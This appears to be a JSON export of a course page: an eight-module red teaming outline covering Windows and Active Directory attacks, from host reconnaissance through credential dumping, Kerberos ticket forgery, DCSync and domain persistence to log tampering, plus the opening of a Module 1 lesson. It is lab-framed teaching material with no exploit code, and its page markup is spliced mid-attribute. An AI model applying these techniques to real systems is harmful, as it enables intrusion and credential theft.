  "overview": "\n        <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n            <h2>About This Course</h2>\n            <div class=\"markdown-content\">\n                <p>Okay, fellow knowledge seekers! Let&#39;s craft a comprehensive course outline that takes us from a simple foothold on a Windows machine all the way to owning the entire Active Directory domain. We&#39;ll break down the complex into the manageable, focusing on hands-on application and the &quot;why&quot; behind the &quot;how.&quot;</p>\n<p>This course is designed to be a deep dive, building practical skills for anyone looking to understand the offensive side of Windows and Active Directory security. We&#39;ll learn by doing, step-by-step, culminating in a full simulation.</p>\n<hr>\n<p><strong>Course Title:</strong> Windows &amp; Active Directory Red Teaming: Initial Access to Domain Dominance</p>\n<p><strong>Overall Course Objective:</strong> By the end of this course, learners will be able to plan, execute, and document a simulated Windows and Active Directory red team operation, effectively replicating the process from initial access context through post-exploitation, lateral movement, and achieving domain dominance objectives in a lab environment.</p>\n<p><strong>Target Audience:</strong> Learners with basic understanding of networking, operating systems (Windows fundamentals), and security concepts. Some prior exposure to command lines (CMD/PowerShell) is beneficial but not strictly required.</p>\n<p><strong>Course Structure:</strong> 8 Modules, progressively building skills and knowledge. Each module includes theory, practical techniques, resources, and a hands-on exercise contributing to the final Capstone Project.</p>\n<hr>\n<p><strong>Module 1: Post-Exploitation Foundations &amp; Initial Host Reconnaissance</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Understand the red team lifecycle&#39;s post-exploitation phase and perform comprehensive initial reconnaissance on a compromised Windows host using native tools and fundamental techniques.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Revisiting the Red Team/Attack Kill Chain (focus on Actions on Objective).</li>\n<li>Understanding the post-exploitation mindset and goals.</li>\n<li>Establishing and maintaining a stable foothold (briefly, assumes initial access is achieved).</li>\n<li>Essential Windows command-line interface (CMD) and PowerShell usage for reconnaissance.</li>\n<li>Gathering system information (<code>systeminfo</code>, registry queries).</li>\n<li>Enumerating users, groups, and sessions (<code>whoami</code>, <code>query user</code>, <code>net user</code>, <code>net localgroup</code>).</li>\n<li>Identifying running processes and services (<code>tasklist</code>, <code>Get-Process</code>, <code>Get-Service</code>).</li>\n<li>Mapping network connections and configuration (<code>ipconfig</code>, <code>netstat</code>, <code>Get-NetIPConfiguration</code>).</li>\n<li>Locating potential data of interest (recent files, browser history, known sensitive locations).</li>\n<li>Basic OpSec considerations for initial host interaction (minimizing noise).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Basic understanding of Windows operating system structure.</li>\n<li>Familiarity with command-line interfaces (CMD, PowerShell).</li>\n<li>Access to a lab environment with at least one target Windows machine (ideally domain-joined later).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Connect to a pre-configured target Windows VM (simulating initial access via RDP, shell, etc.) and perform a thorough initial host reconnaissance using only native Windows commands and PowerShell. Document all gathered information (OS version, users, groups, network config, running processes).</li>\n</ul>\n<hr>\n<p><strong>Module 2: Local Enumeration &amp; Credential Harvesting</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Identify valuable local information, uncover potential weaknesses, and extract cached or stored credentials from a compromised Windows host.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>In-depth local file system enumeration (identifying sensitive directories, configuration files, scripts, user profiles).</li>\n<li>Enumerating installed software and patches (<code>Get-WmiObject -Class Win32_Product</code>, <code>Get-HotFix</code>).</li>\n<li>Understanding Windows credential storage locations (LSASS, Registry Hives, Credential Manager).</li>\n<li>Techniques for dumping LSASS process memory (e.g., using <code>procdump</code> for offline analysis, understanding tools like Mimikatz - <em>focus on concept and usage, not tool development</em>).</li>\n<li>Extracting credentials and hashes from SAM and SECURITY registry hives.</li>\n<li>Identifying and leveraging misconfigurations (<code>AlwaysInstallElevated</code>, weak service permissions - <em>briefly, deep dive in M3</em>).</li>\n<li>Utilizing common post-exploitation scripts and tools for automated enumeration and harvesting (e.g., PowerSploit modules like <code>PowerView</code> for host recon, <code>Invoke-Mimikatz</code>).</li>\n<li>Case Study: Analyzing a real-world breach that heavily relied on credential harvesting.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Understanding of Windows registry structure.</li>\n<li>Basic knowledge of Windows security identifiers (SIDs).</li>\n<li>Access to a lab environment with administrative rights on the target VM (even if temporary).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Using the target VM from Module 1 (potentially reset), attempt to extract credentials from LSASS and registry hives. Use automated scripts/tools to enumerate potential sensitive files or misconfigurations. Document all harvested credentials and identified local weaknesses.</li>\n</ul>\n<hr>\n<p><strong>Module 3: Windows Privilege Escalation</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Identify and exploit common Windows misconfigurations, vulnerabilities, and features to elevate privileges from a standard user to Administrator or SYSTEM on a local host.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Understanding Windows integrity levels and User Account Control (UAC).</li>\n<li>Common UAC bypass techniques and their limitations.</li>\n<li>Exploiting vulnerable services (unquoted service paths, weak service permissions, insecure service binaries).</li>\n<li>Token manipulation and impersonation (<code>Incognito</code> module in Mimikatz, understanding <code>SeImpersonatePrivilege</code>).</li>\n<li>Exploiting insecure file and registry permissions.</li>\n<li>Leveraging auto-logon credentials or saved RDP credentials.</li>\n<li>Kernel exploits (overview of common types and how they are used in PE).</li>\n<li>Using automated PE tools like <code>PowerUp</code>, <code>WinPEAS</code>, <code>Sherlock</code>.</li>\n<li>Case Study: Analyzing specific PE techniques used in known malware or APT campaigns.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Understanding of Windows services and their configuration.</li>\n<li>Knowledge of Windows file system and registry permissions (ACLs).</li>\n<li>Lab environment where you can revert VM snapshots to practice different PE vectors.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> On the target VM, start with a low-privileged user account. Use enumeration techniques from previous modules and PE tools to identify at least two different privilege escalation vectors. Successfully exploit one vector to gain Administrator or SYSTEM privileges. Document the identified vectors and the successful exploitation path.</li>\n</ul>\n<hr>\n<p><strong>Module 4: Lateral Movement Techniques</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Master various techniques to move from a compromised host to other systems within the network using harvested credentials, session reuse, and native tools.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Understanding network topology and trust relationships within a Windows domain.</li>\n<li>Leveraging harvested credentials for lateral movement (introduction to Pass-the-Hash, Overpass-the-Hash - <em>deep dive in M6</em>).</li>\n<li>Lateral movement using native Windows tools:<ul>\n<li>PsExec and its variants (Sysinternals PsExec, Covenant&#39;s PsExec task).</li>\n<li>Windows Management Instrumentation (WMI) via <code>wmiexec.py</code>, <code>Invoke-WmiMethod</code>.</li>\n<li>Remote Desktop Protocol (RDP) with stolen or brute-forced credentials.</li>\n<li>PowerShell Remoting (<code>Invoke-Command</code>, <code>Enter-PSSession</code>).</li>\n</ul>\n</li>\n<li>Session reuse and leveraging existing authenticated sessions.</li>\n<li>Pivoting and tunneling through compromised hosts to reach isolated networks.</li>\n<li>OpSec considerations for lateral movement (network traffic analysis, endpoint detection).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Basic understanding of TCP/IP networking and common ports (135, 139, 445, 5985, 3389).</li>\n<li>Familiarity with Windows authentication basics (NTLM, Kerberos - <em>basic level</em>).</li>\n<li>Lab environment with multiple interconnected Windows machines (domain-joined).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Using credentials harvested or obtained through PE in previous modules, attempt to move laterally to at least two other hosts in the lab environment using different techniques (e.g., PsExec to one, WMI to another). Document the techniques used and proof of access on the new hosts.</li>\n</ul>\n<hr>\n<p><strong>Module 5: Active Directory Enumeration &amp; Attack Path Mapping</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Conduct comprehensive reconnaissance of an Active Directory environment to identify users, groups, computers, trusts, GPOs, and map potential attack paths to high-value targets like Domain Admins.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Introduction to Active Directory concepts (Domain Controllers, Forests, Trusts, OUs, GPOs).</li>\n<li>Using native command-line tools for AD enumeration (<code>net group /domain</code>, <code>net user /domain</code>, <code>nltest</code>, <code>dsquery</code>, <code>dsget</code>).</li>\n<li>Advanced AD enumeration with PowerShell (<code>ActiveDirectory</code> module, <code>PowerView</code> from PowerSploit).</li>\n<li>Enumerating domain trusts and their implications.</li>\n<li>Identifying sensitive groups and users (Domain Admins, Enterprise Admins, Backup Operators, etc.).</li>\n<li>Gathering information about Group Policy Objects (GPOs) and their application.</li>\n<li>Introduction to BloodHound for visualizing and identifying attack paths.</li>\n<li>Setting up and using BloodHound collectors (SharpHound, PowerHound).</li>\n<li>Loading data into Neo4j and querying BloodHound for common attack paths (Shortest path to Domain Admin, Kerberoastable users, AS-REP roastable users, Unconstrained Delegation).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Solid understanding of Active Directory structure and concepts.</li>\n<li>Basic understanding of graph databases (Neo4j).</li>\n<li>Lab environment with a functional Active Directory domain.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> From a domain-joined host (compromised in previous modules), perform extensive AD enumeration using PowerView or native tools. Run a BloodHound collector, import the data into Neo4j, and generate queries to identify potential attack paths leading to Domain Admin. Document key findings and identified paths.</li>\n</ul>\n<hr>\n<p><strong>Module 6: Advanced Credential Attacks</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Deepen understanding of NTLM and Kerberos authentication and execute sophisticated credential-based attacks to obtain hashes, tickets, and gain access to resources.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>In-depth look at NTLM authentication (challenges, responses, hash formats).</li>\n<li>Pass-the-Hash (PtH) techniques and tools (using NTLM hashes directly for authentication).</li>\n<li>Understanding Kerberos authentication (TGT, TGS, SPNs).</li>\n<li>Pass-the-Ticket (PtT) techniques (using Kerberos tickets for authentication).</li>\n<li>Overpass-the-Hash (PtT using NTLM hash to request a TGT).</li>\n<li>Kerberoasting: Identifying Service Principal Names (SPNs), requesting service tickets, and offline cracking of the encrypted ticket portion.</li>\n<li>AS-REP Roasting: Identifying users with &#39;Do not require Kerberos preauthentication&#39; and requesting their initial authentication hash.</li>\n<li>Leveraging tools like Mimikatz, Rubeus, Impacket (e.g., <code>getTGT.py</code>, <code>getST.py</code>, <code>GetUserSPNs.py</code>).</li>\n<li>Defenses and detection methods for these attacks.</li>\n<li>Case Study: How Kerberoasting was used in major breaches.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Good understanding of NTLM and Kerberos authentication flows.</li>\n<li>Familiarity with password cracking tools like Hashcat or John the Ripper.</li>\n<li>Access to tools like Mimikatz, Rubeus, and Impacket.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Using the enumerated AD data and potentially harvested credentials, attempt a Kerberoasting attack to obtain crackable hashes. If successful, attempt to crack the hashes. Attempt a Pass-the-Hash or Overpass-the-Hash attack against another host or service using previously obtained credentials/hashes. Document the attacks and results.</li>\n</ul>\n<hr>\n<p><strong>Module 7: Domain Dominance &amp; Persistence</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Achieve Domain Administrator privileges (or equivalent control) and establish persistent access within the Active Directory environment using advanced techniques.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Leveraging identified attack paths (from BloodHound) to compromise Domain Admins or high-privilege accounts.</li>\n<li>Golden Ticket attacks: Forging a Kerberos Ticket Granting Ticket (TGT) for any user in the domain, allowing impersonation of any user, including Enterprise Admins.</li>\n<li>Silver Ticket attacks: Forging a Kerberos Ticket Granting Service (TGS) for a specific service, allowing access to that service on a specific server.</li>\n<li>SIDHistory exploitation for privilege escalation across trusts.</li>\n<li>Domain Persistence Techniques:<ul>\n<li>DCSync: Simulating a Domain Controller to request password hashes for any user.</li>\n<li>DCShadow: Injecting malicious changes into Active Directory (creating users, modifying group memberships).</li>\n<li>Modifying Group Policy Objects (GPOs) for backdoor creation (startup scripts, scheduled tasks).</li>\n<li>AdminSDHolder and protected groups manipulation.</li>\n<li>Skeleton Key (patching LSASS on DCs).</li>\n<li>Shadow Credentials (abusing certificate services or adding alternative credentials).</li>\n</ul>\n</li>\n<li>OpSec considerations for domain-level actions (detection by monitoring domain events, Sysmon, etc.).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Deep understanding of Active Directory replication and authentication mechanisms.</li>\n<li>Familiarity with the structure of Kerberos tickets.</li>\n<li>Access to tools like Mimikatz, Rubeus, DSInternals, Impacket&#39;s <code>secretsdump.py</code>, <code>dcsync.py</code>.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Assuming Domain Admin access (potentially by resetting the lab or using a provided credential for this exercise), execute at least one Golden Ticket attack and one Silver Ticket attack to access resources. Implement at least two different domain persistence methods (e.g., DCSync hashes for a critical account, create a persistent GPO backdoor). Document the techniques used and verify persistence.</li>\n</ul>\n<hr>\n<p><strong>Module 8: Operational Security (OpSec), Reporting &amp; Capstone Project</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Understand and apply OpSec principles throughout the operation, synthesize all learned techniques, plan a simulated red team engagement, execute it in the lab, and document the process and findings.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Review of OpSec considerations at each stage of the operation (recon, PE, lateral movement, persistence).</li>\n<li>Common detection mechanisms (endpoint security, network monitoring, logging, SIEM rules).</li>\n<li>Techniques for evading detection (process injection, obfuscation, timing, careful tool usage).</li>\n<li>Understanding logging sources (Windows Event Logs, Sysmon, domain controller logs) and basic log tampering/clearing.</li>\n<li>Tradecraft and maintaining stealth.</li>\n<li>Planning a Red Team Operation: Defining objectives, scope, rules of engagement (in a lab context), intelligence gathering, strategy development.</li>\n<li>Documentation and Reporting: Creating clear, actionable reports for different audiences (executive summary, technical findings, recommendations).</li>\n<li><strong>Capstone Project:</strong> Planning and executing a simulated end-to-end red team operation in the lab environment, integrating techniques from all previous modules to achieve a specific objective (e.g., obtain Domain Admin, access a specific sensitive file share from initial low-priv access).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Review of all tools, techniques, and concepts from Modules 1-7.</li>\n<li>Understanding of basic incident response and detection principles.</li>\n<li>A fully configured lab environment mimicking a small enterprise network with AD.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> The Capstone Project.<ul>\n<li><strong>Phase 1: Planning:</strong> Define a specific objective for your mini-red team op in the lab (e.g., &quot;Access the HR file share located on the Domain Controller&quot;). Map out the likely attack path based on your AD enumeration from Module 5. Select the specific techniques you will use for PE, lateral movement, credential attacks, etc.</li>\n<li><strong>Phase 2: Execution:</strong> Start from a low-privileged initial access point in the lab. Execute your planned operation step-by-step, adapting as needed based on your findings. Document <em>everything</em> you do, the tools you use, the commands you run, any errors encountered, and the results at each stage.</li>\n<li><strong>Phase 3: Post-Operation:</strong> Clean up any persistence mechanisms or artifacts (in a real engagement, this would be critical, in a lab, it&#39;s good practice).</li>\n<li><strong>Phase 4: Reporting:</strong> Compile your documentation into a structured report. Include the objective, the steps taken, the techniques used, the findings (e.g., harvested credentials, accessed data), and how the objective was achieved. Reflect on OpSec considerations during your operation.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p>This outline provides a solid framework. Remember, the real learning comes from the hands-on lab work. Building and tearing down the lab environment, practicing techniques until they become second nature, and troubleshooting issues are just as important as understanding the theory. Good luck, and happy hunting (ethically, in your lab)!</p>\n\n            </div>\n            <h2 class=\"module-list-heading\">Course Content</h2> <!-- Add heading for module list -->\n            <ul class=\"module-list\">\n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-1\" data-view=\"module-1\" data-module-order=\"1\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 1: module_1</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_1 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-2\" data-view=\"module-2\" data-module-order=\"2\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 2: module_2</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_2 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24 tent\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 4: module_4</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_4 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-5\" data-view=\"module-5\" data-module-order=\"5\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 5: module_5</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_5 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-6\" data-view=\"module-6\" data-module-order=\"6\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 6: module_6</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_6 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-7\" data-view=\"module-7\" data-module-order=\"7\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 7: module_7</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_7 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-8\" data-view=\"module-8\" data-module-order=\"8\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 8: module_8</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_8 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n   "modules": {
    "module-1": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 1: module_1</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, let&#39;s kick this off! I&#39;m genuinely stoked to guide you through the fascinating world of Windows and Active Directory red teaming. Forget dry lectures; we&#39;re here to build practical skills, understand the attacker&#39;s perspective, and frankly, have some fun breaking things in a controlled, ethical environment.</p>\n<p>This first module is our foundational step. Think of it like landing on a new planet – you&#39;ve arrived (initial access achieved!), but you have <em>no idea</em> what&#39;s around you. Your immediate goal isn&#39;t to conquer the planet, but to figure out: Where are you? What resources are available? Who else is here? What&#39;s the lay of the land?</p>\n<p>That&#39;s exactly what initial host reconnaissance is about. We&#39;ll focus on using the tools <em>already present</em> on the system. Why? Because they&#39;re expected, often less noisy than dropping custom binaries, and surprisingly powerful once you know how to wield them.</p>\n<p>Let&#39;s dive in!</p>\n<hr>\n<h2><strong>Module 1: Post-Exploitation Foundations &amp; Initial Host Reconnaissance</strong></h2>\n<p><strong>Module Objective:</strong> Understand the red team lifecycle&#39;s post-exploitation phase and perform comprehensive initial reconnaissance on a compromised Windows host using native tools and fundamental techniques.</p>\n<p><strong>Alright, so you&#39;ve got a shell... now what?</strong></p>\n<p>This module assumes you&#39;ve already gained some form of initial access to a Windows machine. This could be anything from an RDP session with stolen credentials, a web shell on a vulnerable application, successful exploitation leading to a reverse shell, or even physical access (though less common in pure &quot;red team&quot; simulations unless specified).</p>\n<p>The <em>point</em> is, you are <em>on</em> the system, but likely with limited knowledge of your surroundings. This is where the &quot;Post-Exploitation&quot; phase begins.</p>\n<h3><strong>1.1 Revisiting the Red Team/Attack Kill Chain (Focus on Actions on Objective)</strong></h3>\n<p>You&#39;ve probably seen variations of the cyber kill chain or attack lifecycle. They generally follow a path:</p>\n<ol>\n<li><strong>Reconnaissance:</strong> Gathering information about the target <em>before</em> interacting with it.</li>\n<li><strong>Weaponization:</strong> Pairing an exploit with a backdoor/payload.</li>\n<li><strong>Delivery:</strong> Getting the weaponized payload to the target (phishing, vulnerable service, etc.).</li>\n<li><strong>Exploitation:</strong> Triggering the vulnerability to run your code.</li>\n<li><strong>Installation:</strong> Establishing a persistent foothold.</li>\n<li><strong>Command and Control (C2):</strong> Communicating with your implanted code.</li>\n<li><strong>Actions on Objective:</strong> <em>This is where we are right now.</em> This is the phase where the attacker performs actions to achieve their <em>actual goal</em> – whether it&#39;s data exfiltration, disruption, gaining domain admin, or something else entirely.</li>\n</ol>\n<p>Post-exploitation <em>starts</em> after successful exploitation and often overlaps heavily with Installation, C2, and especially <strong>Actions on Objective</strong>. Our focus in this module is the <em>very first step</em> within Actions on Objective on a new host: <strong>understanding the host itself</strong>.</p>\n<h3><strong>1.2 Understanding the Post-Exploitation Mindset and Goals</strong></h3>\n<p>You&#39;ve got a shell. Great! But what can you <em>do</em> from here? Your immediate goals on this initial host are typically:</p>\n<ul>\n<li><strong>Confirm your access level:</strong> Are you a standard user, an administrator, SYSTEM? This dictates what you can do next.</li>\n<li><strong>Understand the host&#39;s role:</strong> Is it a workstation, a server, a domain controller? Is it critical infrastructure?</li>\n<li><strong>Identify potential avenues for Privilege Escalation (PE):</strong> If you&#39;re a low-privileged user, you <em>must</em> find a way to get higher privileges (Administrator/SYSTEM) to do anything significant.</li>\n<li><strong>Identify potential avenues for Lateral Movement (LM):</strong> This host is just one point. Where else can you go from here? What other machines does it connect to? What credentials are on this machine that might work elsewhere?</li>\n<li><strong>Locate valuable data:</strong> Are there sensitive files, configuration settings, or cached credentials lying around?</li>\n<li><strong>Gather intelligence about the environment:</strong> Is this host domain-joined? What domain? Who uses this machine? What software is installed?</li>\n<li><strong>Prepare for Persistence:</strong> How can you ensure you regain access if your current shell dies or the machine reboots? (We&#39;ll touch on this briefly, but persistence is a deeper topic later).</li>\n<li><strong>Maintain Operational Security (OpSec):</strong> How can you do all of this without getting caught? (Crucial, and we&#39;ll weave this throughout).</li>\n</ul>\n<p>Initial reconnaissance is about answering these questions using the resources immediately at your disposal.</p>\n<h3><strong>1.3 Establishing and Maintaining a Stable Foothold (Briefly)</strong></h3>\n<p>As mentioned, we&#39;re assuming initial access is achieved. However, it&#39;s worth noting that a stable connection is paramount. A wobbly shell that dies every few minutes is useless. Red teamers use various tools (like Cobalt Strike, Covenant, Metasploit, Empire, etc.) to manage agents or implants that provide reliable command and control.</p>\n<p>For our lab purposes, you might be using RDP, a simple Netcat shell, or a Metasploit session. Just ensure you have a consistent way to run commands on the target machine.</p>\n<h3><strong>1.4 Essential Windows Command-Line Interface (CMD) and PowerShell Usage for Reconnaissance</strong></h3>\n<p>Windows offers two primary command-line environments:</p>\n<ol>\n<li><strong>CMD (<code>cmd.exe</code>):</strong> The classic command prompt. It&#39;s older, simpler, and command-based. Many fundamental network and system commands are executed here. It&#39;s universally available on all Windows versions.</li>\n<li><strong>PowerShell (<code>powershell.exe</code>):</strong> A more modern, object-oriented scripting environment. It&#39;s significantly more powerful, allows for much deeper interaction with the operating system, WMI, and Active Directory, and is essential for modern Windows offensive operations. It&#39;s standard on Windows 7+ and Server 2008 R2+.</li>\n</ol>\n<p><strong>Why use both?</strong></p>\n<ul>\n<li>CMD commands are sometimes quicker for simple tasks (<code>ipconfig</code>, <code>whoami</code>).</li>\n<li>PowerShell is indispensable for complex queries, automation, and interacting with system objects (<code>Get-Process</code>, <code>Get-Service</code>, WMI queries, AD module).</li>\n<li>Sometimes defenders monitor one more heavily than the other. Using both can sometimes help stay under the radar, or reveal different types of information.</li>\n</ul>\n<p>For this module, we&#39;ll primarily use PowerShell where available, as it provides richer, more structured data, but we&#39;ll cover essential CMD commands too.</p>\n<p><strong>Getting Started in the Lab:</strong></p>\n<p>Assume you have a shell (e.g., a Metasploit session, a Netcat listener catching a reverse shell, or an RDP connection). You&#39;ll interact with the command line through this session.</p>\n<h3><strong>1.5 Gathering System Information</strong></h3>\n<p>First things first, what kind of machine are we on?</p>\n<h4><strong>Using <code>systeminfo</code> (CMD)</strong></h4>\n<p>This command provides a wealth of information about the system configuration.</p>\n<pre><code class=\"language-cmd\">systeminfo\n</code></pre>\n<p><strong>What to look for in the output:</strong></p>\n<ul>\n<li><strong>OS Name:</strong> (e.g., Microsoft Windows 10 Enterprise, Microsoft Windows Server 2019 Standard) - Tells you the operating system.</li>\n<li><strong>OS Version:</strong> (e.g., 10.0.19044 N/A Build 19044) - Specific build number. Useful for identifying known OS vulnerabilities.</li>\n<li><strong>OS Configuration:</strong> (e.g., Member Workstation, Standalone Server, Domain Controller) - <em>Crucial</em>! Tells you if it&#39;s part of a domain and its role.</li>\n<li><strong>Registered Owner/Organization:</strong> Sometimes reveals internal naming conventions.</li>\n<li><strong>Product ID:</strong> Can sometimes indicate the type of license/install.</li>\n<li><strong>Original Install Date:</strong> How old is this system?</li>\n<li><strong>System Boot Time:</strong> How long has it been running? (Might indicate recent reboots/patching).</li>\n<li><strong>System Manufacturer/Model:</strong> Hardware details.</li>\n<li><strong>System Type:</strong> (e.g., x64-based PC) - Architecture (32-bit or 64-bit). Important for payload compatibility.</li>\n<li><strong>Domain:</strong> If domain-joined, shows the domain name. <strong>Very important!</strong></li>\n<li><strong>Logon Server:</strong> The DC that authenticated the current user. Useful AD info.</li>\n<li><strong>Hotfix(s):</strong> Lists installed patches. Can reveal if specific security patches are missing.</li>\n<li><strong>Network Card(s):</strong> Basic info about network interfaces.</li>\n</ul>\n<p><strong>Example Output Snippet:</strong></p>\n<pre><code>Host Name:                 TARGET-PC\nOS Name:                   Microsoft Windows 10 Enterprise\nOS Version:                10.0.19044 N/A Build 19044\nOS 